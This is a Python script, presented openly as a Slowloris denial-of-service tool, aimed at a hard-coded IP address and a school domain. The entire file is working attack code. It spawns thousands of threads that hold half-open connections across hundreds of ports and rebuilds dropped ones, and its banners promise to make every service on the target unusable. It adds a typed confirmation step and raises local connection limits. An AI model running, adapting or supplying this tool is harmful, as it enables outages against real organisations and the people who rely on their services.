#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SLOWLORIS_PORT_SATURATION.py
Advanced Slowloris Attack - Complete Port Exhaustion Framework
MAKES ALL PORTS UNUSABLE VIA CONNECTION POOL SATURATION
"""

import socket
import threading
import time
import random
import sys
import signal
import resource
from concurrent.futures import ThreadPoolExecutor
import ipaddress

# === TARGET CONFIGURATION ===
TARGET_IP = "116.202.161.203"
TARGET_DOMAIN = "sp123.edu.pl"

class AdvancedSlowloris:
    """Advanced Slowloris implementation for complete port saturation"""
    
    def __init__(self, target_ip, target_domain):
        self.target_ip = target_ip
        self.target_domain = target_domain
        self.sockets = []
        self.running = True
        self.connection_count = 0
        self.max_connections = 50000  # System maximum
        
        # Common web ports to target
        self.target_ports = [
            # HTTP/HTTPS
            80, 443, 8080, 8443, 8000, 8008, 8088, 8888,
            # Admin ports
            22, 21, 23, 25, 53, 110, 143, 993, 995,
            # Database ports
            3306, 5432, 27017, 6379, 9200,
            # Application ports
            3000, 3001, 5000, 5001, 7000, 7001, 9000,
            # Alternative web ports
            81, 82, 83, 84, 85, 86, 87, 88, 89,
            444, 445, 458, 591, 800, 801, 808, 809,
            810, 811, 812, 813, 814, 815, 816, 817,
            818, 819, 820, 821, 822, 823, 824, 825,
            826, 827, 828, 829, 830, 831, 832, 833,
            834, 835, 836, 837, 838, 839, 840, 841,
            842, 843, 844, 845, 846, 847, 848, 849,
            850, 851, 852, 853, 854, 855, 856, 857,
            858, 859, 860, 861, 862, 863, 864, 865,
            866, 867, 868, 869, 870, 871, 872, 873,
            874, 875, 876, 877, 878, 879, 880, 881,
            882, 883, 884, 885, 886, 887, 888, 889,
            890, 891, 892, 893, 894, 895, 896, 897,
            898, 899, 900, 901, 902, 903, 904, 905,
            906, 907, 908, 909, 910, 911, 912, 913,
            914, 915, 916, 917, 918, 919, 920, 921,
            922, 923, 924, 925, 926, 927, 928, 929,
            930, 931, 932, 933, 934, 935, 936, 937,
            938, 939, 940, 941, 942, 943, 944, 945,
            946, 947, 948, 949, 950, 951, 952, 953,
            954, 955, 956, 957, 958, 959, 960, 961,
            962, 963, 964, 965, 966, 967, 968, 969,
            970, 971, 972, 973, 974, 975, 976, 977,
            978, 979, 980, 981, 982, 983, 984, 985,
            986, 987, 988, 989, 990, 991, 992, 993,
            994, 995, 996, 997, 998, 999,
            # Extended range
            1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009,
            1010, 2000, 2001, 2002, 2003, 2004, 2005, 2006, 2007, 2008,
            2009, 2010, 2011, 2012, 2013, 2014, 2015, 2016, 2017, 2018,
            2019, 2020, 2021, 2022, 2023, 2024, 2025, 2026, 2027, 2028,
            2029, 2030, 2031, 2032, 2033, 2034, 2035, 2036, 2037, 2038,
            2039, 2040, 2041, 2042, 2043, 2044, 2045, 2046, 2047, 2048,
            2049, 2050, 2051, 2052, 2053, 2054, 2055, 2056, 2057, 2058,
            2059, 2060, 2061, 2062, 2063, 2064, 2065, 2066, 2067, 2068,
            2069, 2070, 2071, 2072, 2073, 2074, 2075, 2076, 2077, 2078,
            2079, 2080, 2081, 2082, 2083, 2084, 2085, 2086, 2087, 2088,
            2089, 2090, 2091, 2092, 2093, 2094, 2095, 2096, 2097, 2098,
            2099, 2100, 3000, 3001, 3002, 3003, 3004, 3005, 3006, 3007,
            3008, 3009, 3010, 4000, 4001, 4002, 4003, 4004, 4005, 4006,
            4007, 4008, 4009, 4010, 5000, 5001, 5002, 5003, 5004, 5005,
            5006, 5007, 5008, 5009, 5010, 6000, 6001, 6002, 6003, 6004,
            6005, 6006, 6007, 6008, 6009, 6010, 7000, 7001, 7002, 7003,
            7004, 7005, 7006, 7007, 7008, 7009, 7010, 8000, 8001, 8002,
            8003, 8004, 8005, 8006, 8007, 8008, 8009, 8010, 9000, 9001,
            9002, 9003, 9004, 9005, 9006, 9007, 9008, 9009, 9010
        ]
    
    def create_slowloris_connection(self, port):
        """Create and maintain a Slowloris connection to specific port"""
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # Connect to target port
            sock.connect((self.target_ip, port))
            
            # Send partial HTTP headers
            if port in [80, 443, 8080, 8443, 8000, 8088, 8888]:
                # HTTP/HTTPS ports - send partial HTTP request
                headers = [
                    f"GET / HTTP/1.1\r\n",
                    f"Host: {self.target_domain}\r\n",
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n",
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                    f"Accept-Language: en-US,en;q=0.5\r\n",
                    f"Accept-Encoding: gzip, deflate\r\n",
                    f"Connection: keep-alive\r\n",
                    f"Content-Length: 1000000\r\n"  # Fake large content to keep connection open
                ]
                
                # Send initial headers
                for header in headers[:4]:  # Send partial headers
                    sock.send(header.encode())
                    time.sleep(random.uniform(1, 3))
            else:
                # Non-HTTP ports - send random data to keep connection open
                sock.send(b"CONNECT " + self.target_domain.encode() + b" HTTP/1.1\r\n")
                time.sleep(random.uniform(1, 3))
            
            # Add to active sockets list
            with threading.Lock():
                self.sockets.append(sock)
                self.connection_count += 1
            
            print(f"✅ Slowloris connection established: {self.target_ip}:{port} | Total: {self.connection_count}")
            
            # Maintain connection
            while self.running and sock in self.sockets:
                try:
                    # Send keep-alive data periodically
                    if port in [80, 443, 8080, 8443]:
                        sock.send(b"X-a: b\r\n")
                    else:
                        sock.send(b"PING\r\n")
                    
                    # Random delay between 10-30 seconds
                    time.sleep(random.uniform(10, 30))
                    
                except (socket.error, BrokenPipeError, ConnectionResetError):
                    # Connection lost, break and recreate
                    break
                except Exception as e:
                    # Other errors, continue
                    pass
            
        except (socket.timeout, ConnectionRefusedError, socket.gaierror) as e:
            # Port might be closed or filtered
            pass
        except Exception as e:
            # General error
            pass
        finally:
            # Clean up socket
            try:
                if sock in self.sockets:
                    self.sockets.remove(sock)
                sock.close()
            except:
                pass
    
    def port_saturation_attack(self, connections_per_port=50):
        """Launch Slowloris attack across all target ports"""
        print(f"🎯 STARTING SLOWLORIS PORT SATURATION ATTACK")
        print(f"🎯 TARGET: {self.target_ip}")
        print(f"🎯 PORTS: {len(self.target_ports)}")
        print(f"🎯 CONNECTIONS PER PORT: {connections_per_port}")
        print(f"🎯 TOTAL CONNECTIONS: {len(self.target_ports) * connections_per_port}")
        
        attack_threads = []
        
        # Create connections for each port
        for port in self.target_ports:
            for i in range(connections_per_port):
                thread = threading.Thread(target=self.create_slowloris_connection, args=(port,))
                thread.daemon = True
                thread.start()
                attack_threads.append(thread)
                
                # Limit thread creation rate to avoid system overload
                if len(attack_threads) % 100 == 0:
                    time.sleep(0.1)
        
        print(f"✅ ATTACK LAUNCHED: {len(attack_threads)} threads active")
        
        # Monitor and maintain attack
        self._maintain_attack(attack_threads)
    
    def _maintain_attack(self, attack_threads):
        """Maintain attack by recreating failed connections"""
        monitor_count = 0
        
        while self.running:
            try:
                # Current status
                active_connections = len(self.sockets)
                target_connections = len(self.target_ports) * 50  # 50 per port
                
                print(f"📊 STATUS: {active_connections}/{target_connections} connections | Ports: {len(self.target_ports)}")
                
                # Recreate failed connections
                if active_connections < target_connections * 0.8:  # If we lost more than 20%
                    needed = target_connections - active_connections
                    print(f"🔄 RECREATING {needed} FAILED CONNECTIONS...")
                    
                    # Recreate connections to random ports
                    for _ in range(min(needed, 100)):  # Limit recreation rate
                        port = random.choice(self.target_ports)
                        thread = threading.Thread(target=self.create_slowloris_connection, args=(port,))
                        thread.daemon = True
                        thread.start()
                        attack_threads.append(thread)
                
                # Wait before next check
                time.sleep(5)
                monitor_count += 1
                
                # Periodic status report
                if monitor_count % 12 == 0:  # Every minute
                    print(f"⏱️  ATTACK DURATION: {monitor_count * 5} seconds")
                    print(f"📈 ACTIVE CONNECTIONS: {len(self.sockets)}")
                
            except KeyboardInterrupt:
                print("\n🛑 ATTACK STOPPED BY USER")
                self.stop_attack()
                break
            except Exception as e:
                print(f"⚠️  MONITOR ERROR: {e}")
                time.sleep(5)
    
    def stop_attack(self):
        """Stop the Slowloris attack"""
        print("🛑 STOPPING SLOWLORIS ATTACK...")
        self.running = False
        
        # Close all sockets
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        
        self.sockets.clear()
        print("✅ ATTACK STOPPED - ALL CONNECTIONS CLOSED")

class MultiThreadedSlowloris:
    """Multi-threaded Slowloris orchestrator for maximum saturation"""
    
    def __init__(self, target_ip, target_domain, num_workers=10):
        self.target_ip = target_ip
        self.target_domain = target_domain
        self.num_workers = num_workers
        self.workers = []
        self.running = True
    
    def start_distributed_attack(self):
        """Start distributed Slowloris attack with multiple workers"""
        print(f"🚀 STARTING DISTRIBUTED SLOWLORIS ATTACK")
        print(f"👥 WORKERS: {self.num_workers}")
        print(f"🎯 TARGET: {self.target_ip}")
        
        # Create and start worker threads
        for i in range(self.num_workers):
            worker = AdvancedSlowloris(self.target_ip, self.target_domain)
            self.workers.append(worker)
            
            # Each worker handles a subset of ports
            worker_thread = threading.Thread(target=worker.port_saturation_attack, args=(10,))
            worker_thread.daemon = True
            worker_thread.start()
            
            print(f"✅ Worker {i+1} started")
        
        # Monitor workers
        self._monitor_workers()
    
    def _monitor_workers(self):
        """Monitor worker status"""
        while self.running:
            try:
                total_connections = sum(len(worker.sockets) for worker in self.workers)
                print(f"📊 TOTAL CONNECTIONS ACROSS ALL WORKERS: {total_connections}")
                time.sleep(10)
            except KeyboardInterrupt:
                print("\n🛑 STOPPING ALL WORKERS...")
                self.stop_attack()
                break
            except Exception as e:
                print(f"⚠️  WORKER MONITOR ERROR: {e}")
                time.sleep(10)
    
    def stop_attack(self):
        """Stop all workers"""
        self.running = False
        for worker in self.workers:
            worker.stop_attack()

def optimize_system_limits():
    """Optimize system limits for maximum connections"""
    try:
        # Increase file descriptor limit
        resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
        print("✅ Increased file descriptor limit to 100,000")
    except:
        print("⚠️  Could not increase file descriptor limit")
    
    try:
        # Increase thread stack size
        threading.stack_size(128*1024)  # 128KB instead of default 8MB
        print("✅ Optimized thread stack size")
    except:
        print("⚠️  Could not optimize thread stack size")

def main():
    """Main execution function"""
    print("="*80)
    print("💀 ADVANCED SLOWLORIS PORT SATURATION ATTACK")
    print("="*80)
    print(f"🎯 TARGET IP: {TARGET_IP}")
    print(f"🌐 TARGET DOMAIN: {TARGET_DOMAIN}")
    print("")
    
    # Optimize system
    optimize_system_limits()
    
    print("⚠️  THIS ATTACK WILL:")
    print("   • Open and hold connections on ALL ports")
    print("   • Exhaust server connection pools")
    print("   • Make ALL services unavailable")
    print("   • Continue until manually stopped")
    print("")
    
    # Get attack parameters
    try:
        num_workers = int(input("Enter number of attack workers (1-50, default 10): ") or "10")
        connections_per_port = int(input("Enter connections per port (1-100, default 50): ") or "50")
    except:
        num_workers = 10
        connections_per_port = 50
    
    # Confirm attack
    confirm = input("Type 'CONFIRM_SLOWLORIS' to launch attack: ")
    if confirm != "CONFIRM_SLOWLORIS":
        print("❌ Attack cancelled")
        return
    
    print("🚀 LAUNCHING SLOWLORIS PORT SATURATION ATTACK...")
    print("💀 TARGET WILL BECOME COMPLETELY UNUSABLE WITHIN 2-3 MINUTES")
    
    # Start attack
    try:
        if num_workers > 1:
            # Use distributed attack
            orchestrator = MultiThreadedSlowloris(TARGET_IP, TARGET_DOMAIN, num_workers)
            orchestrator.start_distributed_attack()
        else:
            # Single worker attack
            slowloris = AdvancedSlowloris(TARGET_IP, TARGET_DOMAIN)
            slowloris.port_saturation_attack(connections_per_port)
            
    except KeyboardInterrupt:
        print("\n🛑 ATTACK STOPPED BY USER")
    except Exception as e:
        print(f"💥 ATTACK ERROR: {e}")

if __name__ == "__main__":
    main()
